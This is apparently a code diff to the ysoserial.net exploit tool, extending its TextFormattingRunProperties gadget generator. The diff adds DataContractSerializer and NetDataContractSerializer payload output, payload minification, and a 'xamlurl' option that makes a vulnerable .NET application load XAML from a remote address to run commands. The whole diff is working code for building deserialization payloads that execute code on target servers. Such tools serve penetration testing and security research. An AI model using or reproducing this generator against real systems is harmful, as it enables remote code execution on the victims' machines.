@@ -3,6 +3,7 @@ using System.Runtime.Serialization;
 using System.Collections.Generic;
 using Microsoft.VisualStudio.Text.Formatting;
 using ysoserial.Helpers;
+using NDesk.Options;
 
 namespace ysoserial.Generators
 {
@@ -27,21 +28,30 @@ namespace ysoserial.Generators
         }
     }
 
+
     class TextFormattingRunPropertiesGenerator : GenericGenerator
     {
+        private string xaml_url = "";
+        private bool hasRootDCS = false;
+
         public override string Name()
         {
             return "TextFormattingRunProperties";
         }
 
-        public override string Description()
+        public override string AdditionalInfo()
         {
-            return "TextFormattingRunProperties gadget";
+            return "This normally generates the shortest payload";
         }
 
         public override string Finders()
         {
             return "Oleksandr Mirosh and Alvaro Munoz";
+        }
+
+        public override string Contributors()
+        {
+            return "Oleksandr Mirosh, Alvaro Munoz, Soroush Dalili";
         }
 
         public override List<string> Labels()
@@ -51,7 +61,18 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
+            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter", "DataContractSerializer" };
+        }
+
+        public override OptionSet Options()
+        {
+            OptionSet options = new OptionSet()
+            {                
+                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
+                {"hasRootDCS", "To include a root element with the DataContractSerializer payload.", v => hasRootDCS = v != null },
+            };
+
+            return options;
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -111,7 +132,102 @@ namespace ysoserial.Generators
     </ObjectDataProvider>
 </ResourceDictionary>";
             */
-            return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
+
+            if (xaml_url != "")
+            {
+                // this is when it comes from GenerateWithInit 
+                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url};
+            }
+
+            //SerializersHelper.ShowAll(TextFormattingRunPropertiesGadget(inputArgs));
+
+            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
+            {
+                return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
+            }
+            else if (formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
+            {
+                string utfString = System.Text.Encoding.UTF8.GetString((byte [])SerializeWithNoTest(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs));
+
+                string payload = SerializersHelper.NetDataContractSerializer_Marshal_2_MainType(utfString);
+
+                if (inputArgs.Minify)
+                {
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor" }, null, FormatterType.NetDataContractXML, true);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null, FormatterType.NetDataContractXML, true);
+                    }
+                }
+
+                if (inputArgs.Test)
+                {
+                    try
+                    {
+                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
+                    }
+                    catch (Exception err)
+                    {
+                        Debugging.ShowErrors(inputArgs, err);
+                    }
+
+                }
+
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("DataContractSerializer", StringComparison.OrdinalIgnoreCase))
+            {
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
+
+                string payload = "";
+
+                if (hasRootDCS)
+                {
+                    payload = SerializersHelper.DataContractSerializer_Marshal_2_MainType(SerializersHelper.DataContractSerializer_serialize(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), "root", "type", typeof(TextFormattingRunProperties));
+                }
+                else
+                {
+                    payload = SerializersHelper.DataContractSerializer_Marshal_2_MainType(SerializersHelper.DataContractSerializer_serialize(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)));
+                }
+                
+
+                if (inputArgs.Minify)
+                {
+                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
+                }
+
+                if (inputArgs.Test)
+                {
+                    try
+                    {
+                        if (hasRootDCS)
+                        {
+                            SerializersHelper.DataContractSerializer_deserialize(payload, "", "root", "type");
+                        }
+                        else
+                        {
+                            SerializersHelper.DataContractSerializer_deserialize(payload, typeof(TextFormattingRunProperties));
+                        }
+                    }
+                    catch (Exception err)
+                    {
+                        Debugging.ShowErrors(inputArgs, err);
+                    }
+                }
+
+                return payload;
+            }
+            else
+            {
+                throw new Exception("Formatter not supported");
+            }
+                
         }
 
         /* this can be used easily by the plugins as well */
@@ -120,7 +236,7 @@ namespace ysoserial.Generators
         public static object TextFormattingRunPropertiesGadget(string cmd)
         {
             InputArgs inputArgs = new InputArgs();
-            inputArgs.CmdFullString = cmd;
+            inputArgs.Cmd = cmd;
             return TextFormattingRunPropertiesGadget(inputArgs);
         }
 
